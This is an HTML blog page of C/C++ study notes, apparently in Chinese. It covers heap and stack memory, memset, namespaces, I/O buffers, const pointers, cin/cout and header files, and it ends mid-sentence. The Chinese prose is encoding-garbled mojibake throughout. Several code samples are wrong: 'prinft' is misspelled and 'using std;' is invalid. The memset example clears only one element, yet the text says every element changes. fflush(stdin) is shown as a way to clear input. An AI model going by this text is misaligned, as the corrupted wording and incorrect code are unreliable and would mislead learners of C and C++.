&lt;p&gt;ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹äºåŠ¨æ€çš„å†…å­˜å ç”¨è¯·æ±‚ï¼ˆæ¯”å¦‚æ–°å»ºå¯¹è±¡ï¼Œæˆ–è€…ä½¿ç”¨mallocå‘½ä»¤ï¼‰ï¼Œç³»ç»Ÿå°±ä¼šä»é¢„å…ˆåˆ†é…å¥½çš„é‚£æ®µå†…å­˜ä¹‹ä¸­ï¼Œåˆ’å‡ºä¸€éƒ¨åˆ†ç»™ç”¨æˆ·ï¼Œå…·ä½“è§„åˆ™æ˜¯ä»èµ·å§‹åœ°å€å¼€å§‹åˆ’åˆ†ï¼ˆå®é™…ä¸Šï¼Œèµ·å§‹åœ°å€ä¼šæœ‰ä¸€æ®µé™æ€æ•°æ®ï¼Œè¿™é‡Œå¿½ç•¥ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è¦æ±‚å¾—åˆ°10ä¸ªå­—èŠ‚å†…å­˜ï¼Œé‚£ä¹ˆä»èµ·å§‹åœ°å€0x1000å¼€å§‹ç»™ä»–åˆ†é…ï¼Œä¸€ç›´åˆ†é…åˆ°åœ°å€0x100Aï¼Œå¦‚æœå†è¦æ±‚å¾—åˆ°22ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå°±åˆ†é…åˆ°0x1020ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769792971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¿™ç§å› ä¸ºç”¨æˆ·ä¸»åŠ¨è¯·æ±‚è€Œåˆ’åˆ†å‡ºæ¥çš„å†…å­˜åŒºåŸŸï¼Œå«åš Heapï¼ˆå †ï¼‰ã€‚å®ƒç”±èµ·å§‹åœ°å€å¼€å§‹ï¼Œä»ä½ä½ï¼ˆåœ°å€ï¼‰å‘é«˜ä½ï¼ˆåœ°å€ï¼‰å¢é•¿ã€‚Heap çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹å°±æ˜¯ä¸ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œå¿…é¡»æ‰‹åŠ¨é‡Šæ”¾ï¼Œæˆ–è€…ç”±åƒåœ¾å›æ”¶æœºåˆ¶æ¥å›æ”¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. æ ˆ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é™¤äº† Heap ä»¥å¤–ï¼Œå…¶ä»–çš„å†…å­˜å ç”¨å«åš Stackï¼ˆæ ˆï¼‰ã€‚ç®€å•è¯´ï¼ŒStack æ˜¯ç”±äºå‡½æ•°è¿è¡Œè€Œä¸´æ—¶å ç”¨çš„å†…å­˜åŒºåŸŸã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769848639.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main() {
   int a = 2;
   int b = 3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢ä»£ç ä¸­ï¼Œç³»ç»Ÿå¼€å§‹æ‰§è¡Œmainå‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåœ¨å†…å­˜é‡Œé¢å»ºç«‹ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œæ‰€æœ‰mainçš„å†…éƒ¨å˜é‡ï¼ˆæ¯”å¦‚aå’Œbï¼‰éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¸§é‡Œé¢ã€‚mainå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¯¥å¸§å°±ä¼šè¢«å›æ”¶ï¼Œé‡Šæ”¾æ‰€æœ‰çš„å†…éƒ¨å˜é‡ï¼Œä¸å†å ç”¨ç©ºé—´ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769897454.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœå‡½æ•°å†…éƒ¨è°ƒç”¨äº†å…¶ä»–å‡½æ•°ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main() {
   int a = 2;
   int b = 3;
   return add_a_and_b(a, b);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢ä»£ç ä¸­ï¼Œmainå‡½æ•°å†…éƒ¨è°ƒç”¨äº†add_a_and_bå‡½æ•°ã€‚æ‰§è¡Œåˆ°è¿™ä¸€è¡Œçš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¼šä¸ºadd_a_and_bæ–°å»ºä¸€ä¸ªå¸§ï¼Œç”¨æ¥å‚¨å­˜å®ƒçš„å†…éƒ¨å˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤æ—¶åŒæ—¶å­˜åœ¨ä¸¤ä¸ªå¸§ï¼šmainå’Œadd_a_and_bã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨æ ˆæœ‰å¤šå°‘å±‚ï¼Œå°±æœ‰å¤šå°‘å¸§ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769925681.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç­‰åˆ°add_a_and_bè¿è¡Œç»“æŸï¼Œå®ƒçš„å¸§å°±ä¼šè¢«å›æ”¶ï¼Œç³»ç»Ÿä¼šå›åˆ°å‡½æ•°mainåˆšæ‰ä¸­æ–­æ‰§è¡Œçš„åœ°æ–¹ï¼Œç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå°±å®ç°äº†å‡½æ•°çš„å±‚å±‚è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸€å±‚éƒ½èƒ½ä½¿ç”¨è‡ªå·±çš„æœ¬åœ°å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€æœ‰çš„å¸§éƒ½å­˜æ”¾åœ¨ Stackï¼Œç”±äºå¸§æ˜¯ä¸€å±‚å±‚å åŠ çš„ï¼Œæ‰€ä»¥ Stack å«åšæ ˆã€‚ç”Ÿæˆæ–°çš„å¸§ï¼Œå«åš&amp;quot;å…¥æ ˆ&amp;quot;ï¼Œæ ˆçš„å›æ”¶å«åš&amp;quot;å‡ºæ ˆ&amp;quot;ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚&lt;/p&gt;
&lt;p&gt;Stack æ˜¯ç”±å†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€å¼€å§‹ï¼Œä»é«˜ä½ï¼ˆåœ°å€ï¼‰å‘ä½ä½ï¼ˆåœ°å€ï¼‰åˆ†é…ã€‚æ¯”å¦‚ï¼Œå†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€æ˜¯0x8000ï¼Œç¬¬ä¸€å¸§å‡å®šæ˜¯16å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…çš„åœ°å€å°±ä¼šä»0x7FF0å¼€å§‹ï¼›ç¬¬äºŒå¸§å‡å®šéœ€è¦64å­—èŠ‚ï¼Œé‚£ä¹ˆåœ°å€å°±ä¼šç§»åŠ¨åˆ°0x7FB0ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;memset&#34;&gt;memset&lt;/h2&gt;
&lt;p&gt;åŒ…å«åœ¨å¤´æ–‡ä»¶&lt;code&gt;string.h&lt;/code&gt;ä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int a[100];
memset(a, 0, sizeof(int));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;memset&lt;/code&gt;æ˜¯æŒ‰ç…§ä¸€ä¸ªå­—èŠ‚å­—èŠ‚è¿›è¡Œèµ‹å€¼ï¼Œå¦‚æœ&lt;code&gt;memset(a, 1, sizeof(int))&lt;/code&gt;ï¼Œé‚£ä¹ˆæ•°ç»„ä¸­æ¯ä¸ªæ•°éƒ½ä¼šä¸º&lt;code&gt;16843009 = 00000001000000010000000100000001&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;namespaceå’Œå¤´æ–‡ä»¶&#34;&gt;namespaceå’Œå¤´æ–‡ä»¶&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;namespace name{
    //variables, functions, classes
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;name&lt;/code&gt;æ˜¯å‘½åç©ºé—´çš„åå­—ï¼Œå®ƒé‡Œé¢å¯ä»¥åŒ…å«å˜é‡ã€å‡½æ•°ã€ç±»ã€&lt;code&gt;typedef&lt;/code&gt;ã€&lt;code&gt;#define&lt;/code&gt; ç­‰ï¼Œæœ€åç”±&lt;code&gt;{ }&lt;/code&gt;åŒ…å›´ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;::&lt;/code&gt;æ˜¯ä¸€ä¸ªæ–°ç¬¦å·ï¼Œç§°ä¸ºåŸŸè§£ææ“ä½œç¬¦ï¼Œåœ¨C++ä¸­ç”¨æ¥æŒ‡æ˜è¦ä½¿ç”¨çš„å‘½åç©ºé—´ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;using Li::fp;
using std;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;stdio.hã€stdlib.hã€string.h &lt;/code&gt;ç­‰éƒ½æ˜¯Cè¯­è¨€çš„å¤´æ–‡ä»¶ï¼ŒC++ä»¥å¼€å§‹ä¹Ÿåœ¨ç”¨ï¼Œåæ¥ C++ å¼•å…¥äº†å‘½åç©ºé—´çš„æ¦‚å¿µï¼Œè®¡åˆ’é‡æ–°ç¼–å†™åº“ï¼Œå°†ç±»ã€å‡½æ•°ã€å®ç­‰éƒ½ç»Ÿä¸€çº³å…¥ä¸€ä¸ªå‘½åç©ºé—´ï¼Œè¿™ä¸ªå‘½åç©ºé—´çš„åå­—å°±æ˜¯stdã€‚&lt;code&gt;std&lt;/code&gt; æ˜¯ &lt;code&gt;standard&lt;/code&gt; çš„ç¼©å†™ï¼Œæ„æ€æ˜¯â€œæ ‡å‡†å‘½åç©ºé—´â€ã€‚&lt;/p&gt;
&lt;p&gt;åæ¥C++å¼€å‘äº†ä¸€äº›æ–°çš„åº“ï¼Œä¾‹å¦‚&lt;code&gt;iostream&lt;/code&gt;ï¼Œå»æ‰äº†&lt;code&gt;.h&lt;/code&gt;ï¼Œå¯¹Cè¯­è¨€ä¸­çš„åº“æ–‡ä»¶æ”¹å†™æˆ&lt;code&gt;stdio.h&lt;/code&gt;-&amp;gt;&lt;code&gt;cstdio&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;C++åœ¨&lt;code&gt;include&lt;/code&gt;å’Œä½¿ç”¨é&lt;code&gt;.h&lt;/code&gt;å¤´æ–‡ä»¶ä¸­çš„å‡½æ•°å˜é‡æ—¶ï¼Œå¿…é¡»æŒ‡å®š&lt;code&gt;namespace&lt;/code&gt;ï¼Œå› ä¸ºè¿™äº›å¤´æ–‡ä»¶ä¸­å¯èƒ½ä¸æ­¢ä¸€ä¸ª&lt;code&gt;namespace&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç¼“å†²åŒºé—®é¢˜&#34;&gt;ç¼“å†²åŒºé—®é¢˜&lt;/h2&gt;
&lt;p&gt;è¾“å…¥è¾“å‡ºä¸ç›´æ¥å°†ä¿¡æ¯æ”¾åˆ°æŒ‡å®šåœ°ç‚¹ï¼Œè€Œæ˜¯æ”¾åˆ°ç¼“å†²åŒºï¼Œåˆ·æ–°ç¼“å†²åŒºæ—¶æ‰å°†è¿™äº›ä¿¡æ¯è¾“å…¥ã€è¾“å‡ºåˆ°æŒ‡å®šä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;ç¼“å†²åŒºæ˜¯å†…å­˜ç©ºé—´çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨å†…å­˜ä¸­é¢„ç•™äº†ä¸€å®šçš„ç©ºé—´ï¼Œç”¨æ¥æš‚å­˜è¾“å…¥è¾“å‡ºç­‰I/Oæ“ä½œçš„ä¸€äº›æ•°æ®ï¼Œè¿™äº›é¢„ç•™çš„ç©ºé—´å°±æ˜¯ç¼“å†²åŒºã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºC/C++è€Œè¨€ï¼Œ&lt;code&gt;cin&lt;/code&gt;ï¼Œ&lt;code&gt;scanf&lt;/code&gt;ï¼Œ&lt;code&gt;getchar&lt;/code&gt;ç­‰è¾“å…¥å‡½æ•°è¯»å–æ•°æ®æ—¶ï¼Œå¹¶ä¸ä¼šç›´æ¥ä»é”®ç›˜ä¸Šè¯»å–ï¼Œè€Œæ˜¯ä»è¾“å…¥ç¼“å†²åŒºä¸­è¯»å–ï¼Œå³éµå¾ªä¸€ä¸ªè¿‡ç¨‹ï¼š&lt;code&gt;cin &amp;lt;- è¾“å…¥ç¼“å†²åŒº &amp;lt;- é”®ç›˜&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ ·çš„çš„&lt;code&gt;cout&lt;/code&gt;ï¼Œ&lt;code&gt;printf&lt;/code&gt;ï¼Œ&lt;code&gt;putchar&lt;/code&gt;ç­‰è¾“å‡ºå‡½æ•°åœ¨è¾“å‡ºæ•°æ®æ—¶ï¼Œä¸ä¼šç›´æ¥è¾“å‡ºåˆ°å±å¹•ä¸­ï¼Œè€Œæ˜¯å…ˆæ”¾å…¥è¾“å‡ºç¼“å†²åŒºï¼Œç„¶åå†è¾“å‡ºåˆ°æ˜¾ç¤ºè®¾å¤‡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¼“å†²åŒºçš„ä½œç”¨ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å‡å°‘CPUå¯¹I/Oè®¾å¤‡çš„è¯»å†™æ¬¡æ•°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¼“å†²åŒºçš„ç±»å‹ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…¨ç¼“å†²ï¼šåªæœ‰åœ¨ç¼“å†²åŒºè¢«å¡«æ»¡ä¹‹åæ‰ä¼šè¿›è¡ŒI/Oæ“ä½œï¼›æœ€å…¸å‹çš„å…¨ç¼“å†²å°±æ˜¯å¯¹ç£ç›˜æ–‡ä»¶çš„è¯»å†™ï¼›&lt;/li&gt;
&lt;li&gt;è¡Œç¼“å†²ï¼›åªæœ‰åœ¨è¾“å…¥æˆ–è€…æ˜¯è¾“å‡ºä¸­é‡åˆ°æ¢è¡Œç¬¦çš„æ—¶å€™æ‰ä¼šè¿›è¡ŒI/Oæ“ä½œï¼›è¿™å¿ å…è®¸æˆ‘ä»¬ä¸€æ¬¡å†™ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯åªæœ‰åœ¨å†™å®Œä¸€è¡Œä¹‹åæ‰åšI/Oæ“ä½œã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ ‡å‡†è¾“å…¥æµ(&lt;code&gt;stdin&lt;/code&gt;)å’Œæ ‡å‡†è¾“å‡ºæµ(&lt;code&gt;stdout&lt;/code&gt;)æ˜¯è¡Œç¼“å†²ã€‚&lt;/li&gt;
&lt;li&gt;æ— ç¼“å†²ï¼›æ ‡å‡†I/Oä¸ç¼“å­˜å­—ç¬¦ï¼›å…¶ä¸­è¡¨ç°æœ€æ˜æ˜¾çš„å°±æ˜¯æ ‡å‡†é”™è¯¯è¾“å‡ºæµ(&lt;code&gt;stderr&lt;/code&gt;)ï¼Œè¿™ä½¿å¾—å‡ºé”™ä¿¡æ¯å°½å¿«çš„è¿”å›ç»™ç”¨æˆ·ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;ç¼“å†²åŒºæ“ä½œå‡½æ•°(Cè¯­è¨€)ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ ‡å‡†è¾“å‡ºå‡½æ•°ï¼š&lt;code&gt;printf&lt;/code&gt;ã€&lt;code&gt;puts&lt;/code&gt;ã€&lt;code&gt;putchar&lt;/code&gt;ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;æ ‡å‡†è¾“å…¥å‡½æ•°ï¼š&lt;code&gt;scanf&lt;/code&gt;ã€&lt;code&gt;gets&lt;/code&gt;ã€&lt;code&gt;getchar&lt;/code&gt;ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IO_FILE&lt;/code&gt;ï¼š&lt;code&gt;fopen&lt;/code&gt;ã€&lt;code&gt;fwrite&lt;/code&gt;ã€&lt;code&gt;fread&lt;/code&gt;ã€&lt;code&gt;fseek&lt;/code&gt;ç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;fflush&lt;/code&gt;å‡½æ•°çš„ä½œç”¨æ˜¯æ¸…é™¤ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    int a, b;
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;a);
    b = getchar();
    prinft(&amp;quot;%d %p&amp;quot;, a, b);
    return 0;
}
// 123â†“
// 123 0xa

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    int a, b;
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;a);
    fflush(stdin); // æ¸…é™¤æ ‡å‡†è¾“å…¥æµç¼“å†²åŒº
    b = getchar();
    prinft(&amp;quot;%d %p&amp;quot;, a, b);
    return 0;
}
// 123â†“câ†“
// 123 0x63

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;const-char-p-å’Œ-char-const-p-çš„åŒºåˆ«&#34;&gt;const char *p å’Œ char * const p çš„åŒºåˆ«&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;const char *p; // å£°æ˜ä¸€ä¸ªæŒ‡å‘å­—ç¬¦æˆ–å­—ç¬¦ä¸²å¸¸é‡çš„æŒ‡é’ˆ(pæ‰€æŒ‡å‘çš„å†…å®¹ä¸å¯ä¿®æ”¹)
char const *p;// åŒä¸Š
char * const p;//å£°æ˜ä¸€ä¸ªæŒ‡å‘å­—ç¬¦æˆ–å­—ç¬¦ä¸²çš„æŒ‡é’ˆå¸¸é‡ï¼Œå³ä¸å¯ä»¥ä¿®æ”¹pçš„å€¼ï¼Œä¹Ÿå°±æ˜¯åœ°å€æ— æ³•ä¿®æ”¹ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;cinå’Œcout&#34;&gt;cinå’Œcout&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;cout &amp;lt;&amp;lt; &amp;quot;string...&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶ä¸­coutæ˜¯ä¸€ä¸ªé¢„å®šä¹‰åœ¨iostreamä¸­çš„å¯¹è±¡ï¼Œ&amp;lt;&amp;lt;æ˜¯è¿ç®—ç¬¦é‡è½½ï¼Œè¡¨ç¤ºæ’å…¥è¿ç®—ç¬¦ï¼Œå°†åé¢çš„å­—ç¬¦æ’å…¥åˆ°è¾“å‡ºæµå½“ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;endlä¹Ÿæ˜¯é¢„å®šä¹‰åœ¨iostreamä¸­çš„ã€‚&lt;/p&gt;
&lt;p&gt;cinæ˜¯istreamç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œcoutæ˜¯ostreamç±»çš„ä¸€ä¸ªå¯¹è±¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;extern istream cin;		/// Linked to standard input
extern ostream cout;		/// Linked to standard output

getline(cin, str); // getlineä¸æ˜¯ä¸€ä¸ªç±»å‡½æ•°ï¼Œå°†cinä½œä¸ºå‡½æ•°ï¼Œè¡¨ç¤ºä»å“ªé‡Œå»æŸ¥æ‰¾è¾“å…¥
cin.getline(char*, legth); // cinå¯¹è±¡çš„getlineå‡½æ•°æ²¡æœ‰å¤„ç†stringç±»çš„èƒ½åŠ›
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;å‡½æ•°åŸå‹å’Œå‡½æ•°å®šä¹‰ï¼š&lt;/strong&gt;â€˜&lt;/p&gt;
&lt;p&gt;å‡½æ•°åŸå‹ä¹‹äºå‡½æ•°ç±»ä¼¼äºå˜é‡å£°æ˜ä¹‹äºå˜é‡ï¼Œ&lt;code&gt;double sqrt(double);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å‡½æ•°åŸå‹åªæè¿°å‡½æ•°æ¥å£ï¼ŒåŒ…å«å‚æ•°å’Œè¿”å›ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å‡½æ•°å®šä¹‰åŒ…å«äº†ç¼–è¯‘ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;åº“æ–‡ä»¶åŒ…å«äº†å‡½æ•°ç¼–è¯‘ä»£ç ï¼Œè€Œå¤´æ–‡ä»¶ä¸­åˆ™åŒ…å«äº†åŸå‹ã€‚å¯¹äºåº“å‡½æ•°ï¼Œåœ¨ä½¿ç”¨ä¹‹å‰éœ€è¦æä¾›å…¶åŸå‹ï¼Œé€šå¸¸æŠŠåŸå‹æ”¾åˆ°main()ä¹‹å‰ã€‚&lt;/p&gt;
&lt;h2 id=&#34;hå’Œcçš„åŒºåˆ«&#34;&gt;.hå’Œ.cçš„åŒºåˆ«&lt;/h2&gt;
&lt;p&gt;è¦ç†è§£.cæ–‡ä»¶ä¸.hæ–‡ä»¶æœ‰ä»€ä¹ˆä¸åŒä¹‹å¤„ï¼Œé¦–å…ˆéœ€è¦å¼„æ˜ç™½ç¼–è¯‘å™¨çš„å·¥ä½œè¿‡ç¨‹ï¼Œä¸€èˆ¬è¯´æ¥ç¼–è¯‘å™¨ä¼šåšä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é¢„å¤„ç†é˜¶æ®µ(#å¼€å¤´çš„è¯­å¥æ˜¯é¢„å¤„ç†æŒ‡ä»¤ï¼Œå…¶å®é¢„ç¼–è¯‘æ“ä½œå°±æ˜¯ç®€å•çš„æ–‡æœ¬è½¬æ¢)&lt;/li&gt;
&lt;li&gt;è¯æ³•ä¸è¯­æ³•åˆ†æé˜¶æ®µ&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘é˜¶æ®µ,é¦–å…ˆç¼–è¯‘æˆçº¯æ±‡ç¼–è¯­å¥,å†å°†ä¹‹æ±‡ç¼–æˆè·ŸCPUç›¸å…³çš„äºŒè¿›åˆ¶ç ï¼Œç”Ÿæˆå„ä¸ªç›®æ ‡æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;è¿æ¥é˜¶æ®µï¼Œå°†å„ä¸ªç›®æ ‡æ–‡ä»¶ä¸­çš„å„æ®µä»£ç è¿›è¡Œç»å¯¹åœ°å€å®šä½ï¼Œç”Ÿæˆè·Ÿç‰¹å®šå¹³å°ç›¸å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“ç„¶ï¼Œæœ€åè¿˜å¯ä»¥ç”¨objcopyç”Ÿæˆçº¯äºŒè¿›åˆ¶ç ï¼Œä¹Ÿå°±æ˜¯å»æ‰äº†æ–‡ä»¶æ ¼å¼ä¿¡æ¯&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸€èˆ¬.hæ–‡ä»¶æ˜¯å†™ä¸€äº›å¸¸é‡ã€å˜é‡ã€å‡½æ•°ä»¥åŠç±»çš„&lt;strong&gt;å£°æ˜&lt;/strong&gt;ï¼Œè€Œåœ¨.c/.cppä¸­å¯¹ä»–ä»¬è¿›è¡Œ&lt;strong&gt;å®šä¹‰&lt;/strong&gt;ï¼Œä¸€èˆ¬éœ€è¦åŠ ä¸Šé¢„ç¼–è¯‘è¯­å¥ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#ifndef CIRCLE_H
#define CIRCLE_H

//ä½ çš„ä»£ç 

#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;.c/.cppæ–‡ä»¶ä¸»è¦å†™å®ç°å¤´æ–‡ä»¶ä¸­å·²ç»å£°æ˜çš„é‚£äº›å‡½æ•°çš„å…·ä½“ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¼€å¤´å¿…é¡»#includeä¸€ä¸‹å®ç°çš„å¤´æ–‡ä»¶ï¼Œä»¥åŠè¦ç”¨åˆ°çš„å¤´æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;.hæ–‡ä»¶å«ä½œå¤´æ–‡ä»¶ï¼Œå®ƒæ˜¯ä¸èƒ½ç¼–è¯‘çš„ï¼Œ#includeæŒ‡ä»¤å«ä½œé¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå¯ä»¥ç†è§£æˆåœ¨çœŸæ­£ç¼–è¯‘å‰ï¼ŒæŠŠæ‰€æœ‰.hæ–‡ä»¶ä¸­çš„ä»£ç æ›¿æ¢åˆ°å¤´éƒ¨ã€‚æ‰€ä»¥ä¸å»ºè®®åœ¨.hä¸­å£°æ˜å˜é‡ï¼Œå› ä¸ºä¸€ä¸ª.hå¯èƒ½è¢«å¤šä¸ª.cæ–‡ä»¶å¼•ç”¨ï¼Œé‚£ä¹ˆä¼šå‡ºç°é‡å¤å®šä¹‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬.hæ–‡ä»¶å’Œ.c/cppæ–‡ä»¶çš„æ–‡ä»¶åä¸€è‡´ï¼Œå¯ä»¥æ–¹ä¾¿çŸ¥é“è°å’Œè°æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œå½“ç„¶ä¸€ä¸ª.hå’Œ.cä¹‹é—´å¯ä»¥æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä»Cç¼–è¯‘å™¨è§’åº¦çœ‹ï¼Œ.hå’Œ.cçš†æ˜¯æµ®äº‘ï¼Œå°±æ˜¯æ”¹åä¸º.txtã€.docä¹Ÿæ²¡æœ‰å¤§çš„åˆ†åˆ«ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯.hå’Œ.cæ²¡å•¥å¿…ç„¶è”ç³»ã€‚.hä¸­ä¸€èˆ¬æ”¾çš„æ˜¯åŒå.cæ–‡ä»¶ä¸­å®šä¹‰çš„å˜é‡ã€æ•°ç»„ã€å‡½æ•°çš„å£°æ˜ï¼Œéœ€è¦è®©.cå¤–éƒ¨ä½¿ç”¨çš„å£°æ˜ã€‚è¿™ä¸ªå£°æ˜æœ‰å•¥ç”¨ï¼Ÿåªæ˜¯è®©éœ€è¦ç”¨è¿™äº›å£°æ˜çš„åœ°æ–¹æ–¹ä¾¿å¼•ç”¨ã€‚å› ä¸º#include &amp;quot;xx.h&amp;quot; è¿™ä¸ªå®å…¶å®é™…æ„æ€å°±æ˜¯æŠŠå½“å‰è¿™ä¸€è¡Œåˆ æ‰ï¼ŒæŠŠxx.h ä¸­çš„å†…å®¹åŸå°ä¸åŠ¨çš„æ’å…¥åœ¨å½“å‰è¡Œçš„ä½ç½®ã€‚ç”±äºæƒ³å†™è¿™äº›å‡½æ•°å£°æ˜çš„åœ°æ–¹éå¸¸å¤šï¼ˆæ¯ä¸€ä¸ªè°ƒç”¨xx.c ä¸­å‡½æ•°çš„åœ°æ–¹ï¼Œéƒ½è¦åœ¨ä½¿ç”¨å‰å£°æ˜ä¸€ä¸‹å­ï¼‰ï¼Œæ‰€ä»¥ç”¨#include &amp;quot;xx.h&amp;quot; è¿™ä¸ªå®å°±ç®€åŒ–äº†è®¸å¤šè¡Œä»£ç â€”â€”è®©é¢„å¤„ç†å™¨è‡ªå·±æ›¿æ¢å¥½äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œxx.h å…¶å®åªæ˜¯è®©éœ€è¦å†™xx.c ä¸­å‡½æ•°å£°æ˜çš„åœ°æ–¹è°ƒç”¨ï¼ˆå¯ä»¥å°‘å†™å‡ è¡Œå­—ï¼‰ï¼Œè‡³äºinclude è¿™ä¸ª.h æ–‡ä»¶æ˜¯è°ï¼Œæ˜¯.h 